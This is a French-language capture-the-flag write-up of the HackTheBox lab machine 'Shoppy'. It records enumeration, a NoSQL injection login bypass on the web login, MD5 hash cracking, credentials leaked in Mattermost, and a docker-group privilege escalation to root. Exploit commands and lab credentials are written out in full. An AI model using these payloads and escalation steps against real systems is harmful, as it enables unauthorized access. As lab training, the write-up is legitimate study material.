\chapter{Shoppy}
\begin{itemize}
    \item {\bf technics}: docker privesc, nosql injection
    \item {\bf Components}:  
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Discovery}

\subsubsection{nmap}

\begin{verbatim}
$ sudo nmap -sV -sC -oX nmap.xml 10.10.11.180
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 16:52 CEST
Nmap scan report for 10.10.11.180
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}


\subsubsection{http}

\begin{verbatim}
$ ffuf -u  http://shoppy.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
login                   [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 72ms]
admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 42ms]
\end{verbatim}


test de sqlmap mais il rencontre des difficulités. En fait les \verb+'+ posent
un soucis mais bon.

\begin{verbatim}
$ sqlmap -r /tmp/sqlmap.request --tamper=apostrophemask

[18:29:55] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests

$ sqlmap -r /tmp/sqlmap.request --tamper=apostrophemask --risk 3 --level 3

[18:40:08] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
\end{verbatim}

par contre
\begin{verbatim}
http://shoppy.htb/login?error=../../../../win.ini
\end{verbatim}

semble boucler un peu

on va faire un \verb+dotdotpwn+ ne donne rien :
\begin{verbatim}
$ dotdotpwn -m http-url -u http://shoppy.htb/login?error=TRAVERSAL \
    -M GET -k Mail -f /windows/win.ini
Fuzz testing finished after 41.82 minutes (2509 seconds)
[+] Total Traversals found: 0
\end{verbatim}


\begin{verbatim}
$ ffuf -u  http://shoppy.htb/login?FUZZ=WrongCredentials -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt  -fs 1074

error                   [Status: 200, Size: 1131, Words: 167, Lines: 27, Duration: 36ms]
\end{verbatim}

le fuff des extensions ne passe pas

\begin{verbatim}

\end{verbatim}


\subsubsection{nmap v2} 

\begin{verbatim}
$ sudo nmap -p- 10.10.11.180
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 18:40 CEST
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.050s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat

$ sudo nmap -sC -sV -p9093 10.10.11.180
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-22 18:41 CEST
Nmap scan report for shoppy.htb (10.10.11.180)
Host is up (0.038s latency).

PORT     STATE SERVICE  VERSION
9093/tcp open  copycat?
| fingerprint-strings:
|   GenericLines:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Thu, 22 Sep 2022 16:42:08 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 1279
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 1279
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 3.3013e-05
|     go_gc_duration_seconds{quantile="0.25"} 6.1335e-05
|   HTTPOptions:
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Thu, 22 Sep 2022 16:42:09 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 1279
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 1279
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 3.3013e-05
|_    go_gc_duration_seconds{quantile="0.25"} 6.1335e-05
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9093-TCP:V=7.92%I=7%D=9/22%Time=632C9060%P=x86_64-pc-linux-gnu%r(Ge
SF:05\ngo_");
\end{verbatim}

\subsubsection{http}

\begin{verbatim}
 ffuf -u http://shoppy.htb/admin/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

search-users            [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 39ms]
\end{verbatim}


\verb+a'aaa+ crash la page donc normalement la requete scope le param avec
\verb+'+




\begin{verbatim}
username=admin&password[%24ne]=
\end{verbatim}

valid login bypass \verb+admin '||' 1=1+

search-user endpoint

\begin{verbatim}
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"}]
\end{verbatim}

si l'on retappe la même chose dans la fonction de recher des users on a la
liste

\begin{verbatim}
0	
_id	"62db0e93d6d6a999a66ee67a"
username	"admin"
password	"23c6877d9e2b564ef8b32c3a23de27b2"
1	
_id	"62db0e93d6d6a999a66ee67b"
username	"josh"
password	"6ebcea65320589ca4f2f1ce039975995"
\end{verbatim}

\begin{verbatim}
hashcat -m 0 hash.txt /usr/share/wordlists/passwords/rockyou.txt --show

6ebcea65320589ca4f2f1ce039975995:remembermethisway
\end{verbatim}

le password ne marche pas en ssh.

\begin{verbatim}
$ ffuf -u  http://10.10.11.180 -H 'Host: FUZZ.shoppy.htb' \
  -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt\
  -fs 169

mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 34ms]
\end{verbatim}

mattermost enterprise edition

\begin{verbatim}
Mattermost Enterprise Edition

Modern communication from behind your firewall.
Mattermost Version: 7.1.2
Database Schema Version: 89
Database: postgres
\end{verbatim}

on peut upload

\begin{verbatim}
jaeger
10:22 AM

Hey @josh,

For the deploy machine, you can create an account with these creds :
username: jaeger
password: Sh0ppyBest@pp!
And deploy on it.
\end{verbatim}

\subsubsection{Code of login}
\begin{verbatim}
app.post('/login', async (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    if (username === undefined || password === undefined) {
        res.status(400).send('Bad Request');
        return;
    }
    const passToTest = require('crypto').createHash('md5').update(password).digest('hex');
    const query = { $where: `this.username === '${username}' && this.password === '${passToTest}'` };
    const result = await User.find(query).maxTimeMS(350);
    if (result.length === 0) {
        res.redirect('/login?error=WrongCredentials');
    } else {
        req.session.username = req.body.username;
        req.session.save((error) => {
            if (error) {
                res.redirect('/login?error=WrongCredentials');
            } else {
                res.redirect('/admin');
            }
        });
    }
});
\end{verbatim}




\subsection{Footholded}

\begin{verbatim}
$ ./linpeas.sh -P 'Sh0ppyBest@pp!'

           CVEs Check
Vulnerable to CVE-2022-0847



           PATH
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
/home/jaeger/.nvm/versions/node/v18.6.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
New path exported: /home/jaeger/.nvm/versions/node/v18.6.0/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/sbin:/usr/sbin:/sbin

           Cleaned processes
 Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes
jaeger     15149  0.0  0.4  12260  9084 pts/0    Ss   19:47   0:00 -bash
jaeger     15347  0.2  0.1   3764  2676 pts/0    S+   19:48   0:00  _ /bin/sh ./linpeas.sh
jaeger     18316  0.0  0.0   3764  1280 pts/0    S+   19:48   0:00      _ /bin/sh ./linpeas.sh
jaeger     18317  0.0  0.1   9732  3276 pts/0    R+   19:48   0:00      |   _ ps fauxwww
jaeger     18320  0.0  0.0   3764  1280 pts/0    S+   19:48   0:00      _ /bin/sh ./linpeas.sh
jaeger      1176  0.0  2.9 642140 58728 ?        Ssl  Sep23   0:35 PM2 v5.2.0: God Daemon (/home/jaeger/.pm2)
jaeger      1245  1.9  4.2 753532 85304 ?        Ssl  Sep23  24:16  _ node /home/jaeger/ShoppyApp/index.js


           Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
\end{verbatim}

Si on fait un cat du programme on peut lire :
\begin{verbatim}
Welcome to Josh password manager!Please enter your master password: SampleAccess 
granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident
will be reported
\end{verbatim}

\begin{verbatim}
$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
\end{verbatim}

\subsection{Lateral}

\begin{verbatim}
$ more password-manager.cpp
...
    master_password += "S";
    master_password += "a";
    master_password += "m";
    master_password += "p";
    master_password += "l";
    master_password += "e";
...
\end{verbatim}

\begin{verbatim}
        My user
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)


$ docker image ls
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   2 months ago   5.53MB

$ docker  run -it --volume /root:/tmp/root alpine:latest sh

\end{verbatim}


\section{Theorie}

